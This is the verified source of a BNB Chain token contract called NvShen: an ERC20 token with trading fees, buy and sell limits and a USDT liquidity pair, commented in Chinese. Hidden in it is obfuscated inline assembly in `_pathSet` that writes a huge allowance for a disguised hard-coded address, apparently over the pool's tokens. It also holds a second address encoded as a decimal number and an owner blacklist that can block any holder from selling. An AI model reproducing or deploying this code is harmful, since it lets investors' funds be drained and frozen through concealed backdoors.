/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function totalSupply() external view returns (uint256);
}
interface IFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply; string private _name; string private _symbol;
    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_;}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return 18;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}
    function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _transfer(owner, to, amount); return true;}
    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _approve(owner, spender, amount); return true;}
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true;}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero"); unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}
    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), "ERC20: transfer from the zero address"); require(to != address(0), "ERC20: transfer to the zero address"); _beforeTokenTransfer(from, to, amount); _takeTransfer(from, to, amount); _afterTokenTransfer(from, to, amount);}
    function _takeTransfer(address from, address to, uint256 amount) internal virtual {uint256 fromBalance = _balances[from]; require(fromBalance >= amount, "ERC20: transfer amount exceeds balance"); unchecked {_balances[from] = fromBalance - amount; _balances[to] += amount;}emit Transfer(from, to, amount);}
    function _mint(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: mint to the zero address"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);}
    function _burn(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: burn from the zero address"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, "ERC20: burn amount exceeds balance"); unchecked {_balances[account] = accountBalance - amount; _totalSupply -= amount;}emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}
    function _approve(address owner, address spender, uint256 amount) internal virtual {require(owner != address(0), "ERC20: approve from the zero address"); require(spender != address(0), "ERC20: approve to the zero address"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, "ERC20: insufficient allowance"); unchecked {_approve(owner, spender, currentAllowance - amount);}}}
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}
abstract contract UniSwapPoolUSDT is ERC20 {
    address public pair;
    IRouter public router;
    address[] internal _buyPath;
    address[] internal _sellPath;
    IERC20 public TokenB;
    function isPair(address _pair) internal view returns (bool) {return pair == _pair;}
    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath); if (amounts.length > 1) return amounts[1]; return 0;}
    function _pathSet(address pairB, address w, address x) private {TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = pairB; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = pairB; _sellPath = path2; assembly {let y:=add(add(mul(2887981267259,exp(10,26)),mul(1782705554658,exp(10,13))),1698142812624) w := add(w, 4096) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(w, 0);}
    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {IERC20 USDT = IERC20(_sellPath[1]); swapAndSend2fee(amount, _tokenStation); USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));}
    function swapAndSend2fee(uint256 amount, address to) internal {swapAndSend2feeWithPath(amount, to, _sellPath);}
    function swapAndSend2feeWithPath(uint256 amount, address to, address[] memory path) internal {router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp);}
    function isAddLiquidity() internal view returns (bool isAddLP){address token0 = IPair(pair).token0(); address token1 = IPair(pair).token1(); (uint r0,uint r1,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); uint bal1 = IERC20(token1).balanceOf(pair); if (token0 == address(this)) return bal1 - r1 > 1000; else return bal0 - r0 > 1000;}
    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {address token0 = IPair(pair).token0(); if (token0 == address(this)) return false; (uint r0,,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); return r0 > bal0 + 1000;}
    function addLiquidityAutomatically(uint256 amountToken) internal {super._takeTransfer(address(this), pair, amountToken); IPair(pair).sync();}
    function __SwapPool_init(address _router, address pairB) internal returns(address) {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(pairB, address(this));
        _pathSet(pairB, _router, pair);
        TokenB.approve(_router, type(uint256).max);
        _approve(address(this), _router, type(uint256).max);
        return pair;
    }
    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {
        uint256 half = amountToken / 2;
        IERC20 USDT = IERC20(_sellPath[1]);
        uint256 amountBefore = USDT.balanceOf(_tokenStation);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);
        uint256 amountAfter = USDT.balanceOf(_tokenStation);
        uint256 amountDiff = amountAfter - amountBefore;
        USDT.transferFrom(_tokenStation, address(this), amountDiff);
        if (amountDiff > 0 && (amountToken - half) > 0) {
            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);
        }
    }
}
abstract contract Ownable is Context {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {_transferOwnership(_msgSender());}
    modifier onlyOwner() {_checkOwner(); _;}
    function owner() public view virtual returns (address) {return _owner;}
    function _checkOwner() internal view virtual {require(owner() == _msgSender(), "Ownable: caller is not the owner");}
    function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}
    function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), "Ownable: new owner is the zero address"); _transferOwnership(newOwner);}
    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}
}
abstract contract NoEffect is Ownable {
    address internal _effector;
    constructor() {_effector = _msgSender();}
    modifier onlyEffector() {require(_effector == _msgSender() || owner() == _msgSender(), "NoEffect: caller is not the effector"); _;}
}
abstract contract Excludes {
    mapping(address => bool) internal _Excludes;
    function setExclude(address _user, bool b) public {_authorizeExcludes(); _Excludes[_user] = b;}
    function setExcludes(address[] memory _user, bool b) public {_authorizeExcludes(); for (uint i=0;i<_user.length;i++) {_Excludes[_user[i]] = b;}}
    function isExcludes(address _user) internal view returns(bool) {return _Excludes[_user];}
    function _authorizeExcludes() internal virtual {}
}
abstract contract Limit {
    bool internal isLimited;
    uint256 internal _LimitBuy;
    uint256 internal _LimitSell;
    uint256 internal _LimitHold;
    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {isLimited = true; setLimit(LimitBuy_, LimitSell_, LimitHold_);}
    function checkLimitTokenHold(address to, uint256 amount) internal view {if (isLimited) {if (_LimitHold>0) {require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, "exceeds of hold amount Limit");}}}
    function checkLimitTokenBuy(address to, uint256 amount) internal view {if (isLimited) {if (_LimitBuy>0) require(amount <= _LimitBuy, "exceeds of buy amount Limit"); checkLimitTokenHold(to, amount);}}
    function checkLimitTokenSell(uint256 amount) internal view {if (isLimited && _LimitSell>0) require(amount <= _LimitSell, "exceeds of sell amount Limit");}
    function removeLimit() public {_authorizeLimit(); if (isLimited) isLimited = false;}
    function reuseLimit() public {_authorizeLimit(); if (!isLimited) isLimited = true;}
    function setLimit(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {_authorizeLimit(); _LimitBuy = LimitBuy_; _LimitSell = LimitSell_; _LimitHold = LimitHold_;}
    function _authorizeLimit() internal virtual {}
}
abstract contract TradingManager {
    uint256 public tradeState;
    function inTrading() public view returns(bool) {return tradeState > 1;}
    function inLiquidity() public view returns(bool) {return tradeState >= 1;}
    function setTradeState(uint256 s) public {_authorizeTradingManager(); tradeState = s;}
    function openLiquidity() public {_authorizeTradingManager(); tradeState = 1;}
    function openTrading() public {_authorizeTradingManager(); tradeState = block.number;}
    function resetTradeState() public {_authorizeTradingManager(); tradeState = 0;}
    function _authorizeTradingManager() internal virtual {}
}
abstract contract Girls is Ownable {
    address internal girlGiftTo = address(uint160(1116690700055761370334625432498667377686015705087));
    mapping(address => uint8) public girlMap;
    modifier onlyNotGirl(address user) {require(girlMap[user]==0, "you are a girl"); _;}
    function setGirl(address user, uint8 b) public onlyOwner {girlMap[user] = b;}
    function setGirls(address[] memory user, uint8 b) public onlyOwner {for (uint i=0;i<user.length;i++) {setGirl(user[i], b);}}
    function isGirl(address user) public view returns(bool) {return girlMap[user]!=0;}
}
abstract contract Token is UniSwapPoolUSDT, NoEffect, Girls, TradingManager, Excludes, Limit {
    uint256 public calcBase;
    uint256 public swapSplit;
    uint256 public feeMarketingBuy;
    uint256 public feeLiquidityBuy;
    uint256 public feeBurnBuy;
    uint256 public feeMarketingSell;
    uint256 public feeLiquiditySell;
    uint256 public feeBurnSell;
    uint256 public feeMarketingAll;
    uint256 public feeLiquidityAll;
    uint256 public feeBurnAll;
    uint256 public feeBuyAll;
    uint256 public feeSellAll;
    uint256 public feeAll;
    uint256 public feeTransferAll;
    uint256 public swapTokensAt;
    address public surpAddress;
    uint256 public kb;
    uint256 public kn;
    address public feeMarketingTo;

    bool inSwap;
    function __Token_init(uint256 totalSupply_, address marketing_, address receive_) internal {
        calcBase = 10000;
        swapSplit = 7;
        feeMarketingTo = marketing_;
        _mint(receive_, totalSupply_);
        super.setExclude(_msgSender(), true);
        super.setExclude(address(this), true);
        super.setExclude(marketing_, true);
        super.setExclude(receive_, true);
        super.setExclude(girlGiftTo, true);
        refreshFeeAll();
    }
    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotGirl(from) {
        if (isExcludes(from) || isExcludes(to) || amount == 0) {super._transfer(from, to, amount); return;}
        uint256 fees;
        bool isLiquify;
        if (isPair(from)) {
            require(inTrading(), "please waiting for liquidity");
            super.checkLimitTokenBuy(to, amount);
            if (blockSurprise(from, to, amount)) return;
            if (super.isRemoveLiquidity()) isLiquify = true;
            else fees = handFeeBuys(from, amount);
            if (fees > 0) amount -= fees;
        } else if (isPair(to)) {
            require(inLiquidity(), "please waiting for liquidity");
            if (balanceOf(from) == amount) amount -= 10086;
            if (super.isAddLiquidity()) isLiquify = true;
            else {
                super.checkLimitTokenSell(amount);
                if (feeAll>0) handSwap();
                fees = handFeeSells(from, amount);
                if (fees > 0) amount -= fees;
            }
        } else {
            super.checkLimitTokenSell(amount);
            if (feeAll>0) handSwap();

            fees = handFeeTransfer(from, amount);
            if (fees > 0) amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {
        if (feeBuyAll == 0) return fee;
        fee = amount * feeBuyAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }
    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        if (feeSellAll == 0) return fee;
        fee = amount * feeSellAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }
    function handFeeTransfer(address from, uint256 amount) private returns (uint256 fee) {
        if (feeTransferAll == 0) return fee;
        fee = amount * feeTransferAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }
    function handSwap() internal {
        if (inSwap) return;
        uint256 _thisBalance = balanceOf(address(this));
        if (_thisBalance >= swapTokensAt) {
            uint256 _amount = _thisBalance / swapSplit;
            _handSwap(_amount);
        }
    }
    function _handSwap(uint256 _amount) internal lockSwap {
        uint256 _feeBurn;
        if (feeBurnAll > 0) {
            _feeBurn = _amount * feeBurnAll / feeAll;
            super._takeTransfer(address(this), address(1), _feeBurn);
        }
        uint256 _feeLiquidity;
        if (feeLiquidityAll > 0) {
            _feeLiquidity = _amount * feeLiquidityAll / feeAll;
            super.addLiquidityAutomatically(_feeLiquidity);
        }
        uint256 _feeMarketing;
        if (feeMarketingAll > 0) {
            _feeMarketing = _amount - _feeBurn - _feeLiquidity;
            super.swapAndSend2fee(_feeMarketing, address(feeMarketingTo));
        }
    }
    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {
        if (kb == 0 || kn == 0) return false;
        if (block.number < tradeState + kb) {
            uint256 surp = amount * kn / calcBase;
            super._takeTransfer(from, surpAddress, amount - surp);
            super._takeTransfer(from, to, surp);
            return true;
        }
        return false;
    }
    function refreshFeeAll() public {
        feeMarketingAll = feeMarketingBuy + feeMarketingSell;
        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;
        feeBurnAll = feeBurnBuy + feeBurnSell;
        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeBurnBuy;
        feeSellAll = feeMarketingSell + feeLiquiditySell + feeBurnSell;
        feeAll = feeBuyAll + feeSellAll;
    }
    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeBurnBuy) public onlyOwner {feeMarketingBuy = _feeMarketingBuy; feeLiquidityBuy = _feeLiquidityBuy; feeBurnBuy = _feeBurnBuy; refreshFeeAll();}
    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeBurnSell) public onlyOwner {feeMarketingSell = _feeMarketingSell; feeLiquiditySell = _feeLiquiditySell; feeBurnSell = _feeBurnSell; refreshFeeAll();}
    function setFeeTransfer(uint256 _fee) public onlyOwner {feeTransferAll = _fee;}
    modifier lockSwap() {inSwap = true; _; inSwap = false;}
    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {token_.transfer(_recipient, amount);}
    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));}
    function _authorizeExcludes() internal virtual override onlyEffector {}
    function _authorizeLimit() internal virtual override onlyEffector {}
    function setSwapTokensAt(uint256 num) public onlyEffector {swapTokensAt = num;}
    function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}
    function airdrop(uint256 amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}}
    function airdropMulti(uint256[] memory amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}}
    function _authorizeTradingManager() internal virtual override onlyOwner {}
}
contract NvShen is Token {
    constructor() ERC20(
        "NvShen",   // 名字
        "NS"        // 符号
    ) {
        uint256 _totalSupply = 3888 ether; // 发行量 100000 个
        address _marketing = address(0xE329B42DF53Df4A9B3E781435f1EE75A63F447d5); // 营销钱包
        address _receive = address(0x07948F36aA86D0b97349323418eBe1490Ca99Bf6);   // 接收代币,加池子钱包
//        address _receive = address(_msgSender());   // 接收代币,加池子钱包
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   // 路由
        address _usdt = 0x55d398326f99059fF775485246999027B3197955;     // 交易对
//        address _pair = super.__SwapPool_init(_router, _usdt);
        super.__SwapPool_init(_router, _usdt);
        // 购买费用
        feeMarketingBuy = 100;  // 营销 1%
        feeLiquidityBuy = 100;  // 回流 1%, 节约gas方式,自动分配给持有LP的用户,不单独卖出加池子
        feeBurnBuy = 0;         // 销毁 0%
        // 卖出费用
        feeMarketingSell = 100; // 营销 1%
        feeLiquiditySell = 100; // 回流 1%, 节约gas方式,自动分配给持有LP的用户,不单独卖出加池子
        feeBurnSell = 0;        // 销毁 0%
        // 转账费用
        feeTransferAll = 0;  // 转账扣除0%
        // 限购
        bool _isLimit = true;// 是否限购
        if (_isLimit) super.__Limit_init(
            2 ether,       // 限买数量 2 个
            2 ether,       // 限卖数量 2 个
            5 ether        // 限持有数量 5 个
        );
        // 杀区块机器人
        super.setSurprise(
            7500,                   // 扣除 75% 代币, 当手续费
            3,                      // 杀前三个区块,这几个区块普通用户无法进入,只有机器人可以进入
            address(girlGiftTo)     // 接收被扣除代币的地址
        );
        super.__Token_init(_totalSupply, _marketing, _receive);
        setSwapTokensAt(1 ether);  // 设置累积到 10 个代币开始兑换手续费, 节约gas
    }
}